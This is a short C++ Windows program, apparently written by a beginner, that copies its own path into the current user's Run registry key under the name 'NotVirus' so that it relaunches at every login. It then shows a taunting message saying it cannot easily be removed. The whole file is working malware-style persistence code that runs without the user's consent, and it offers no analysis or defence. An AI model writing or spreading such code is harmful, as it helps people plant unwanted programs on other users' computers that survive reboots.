#include <windows.h>
#include <iostream>

void MakeItPersistent() {
    char myPath[MAX_PATH];

    GetModuleFileNameA(NULL, myPath, MAX_PATH); // this fanction gives us the pat for our exe

    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // i found in ggogle that this path is for the startups

	if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) { // open the registry
        // Create a new value called "NotVirus" and point it to our file
        RegSetValueExA(hKey, "NotVirus", 0, REG_SZ, (BYTE*)myPath, strlen(myPath) + 1);

        RegCloseKey(hKey);// Close it so we don't look like total noobs
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // call the fun to so we will appear back apter reboot
    MakeItPersistent();

    MessageBoxA(NULL, "I'm back! You can't get rid of me that easily.", "NotVirus", MB_OK | MB_ICONEXCLAMATION); // the pop up window itself

    return 0;
}